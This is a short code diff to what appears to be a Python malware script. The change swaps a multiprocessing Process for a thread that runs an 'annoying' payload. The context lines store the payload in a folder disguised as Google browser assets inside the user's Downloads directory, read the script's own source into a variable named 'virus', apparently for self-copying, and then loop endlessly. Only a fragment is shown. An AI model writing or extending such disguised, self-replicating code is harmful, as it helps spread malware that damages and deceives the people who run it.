@@ -1,5 +1,5 @@
 import os, time, sys
-from multiprocessing import Process
+import threading
 import importlib
 home_dir = os.path.expanduser("~")
 payload_path = f"{home_dir}\\Downloads\\Google_Stable_x64\\assets\\cache"
@@ -14,7 +14,7 @@ annoying_file = os.path.join(payload_path,"youtube_com.py")
 annoying_file_content = open(annoying_file, "r").read()
 virus = open(__file__, "r").read()
 
-annoying_func_thread = Process(target=annoying.start)
+annoying_func_thread = threading.Thread(target=annoying.start)
 annoying_func_thread.start()
 
 while True:
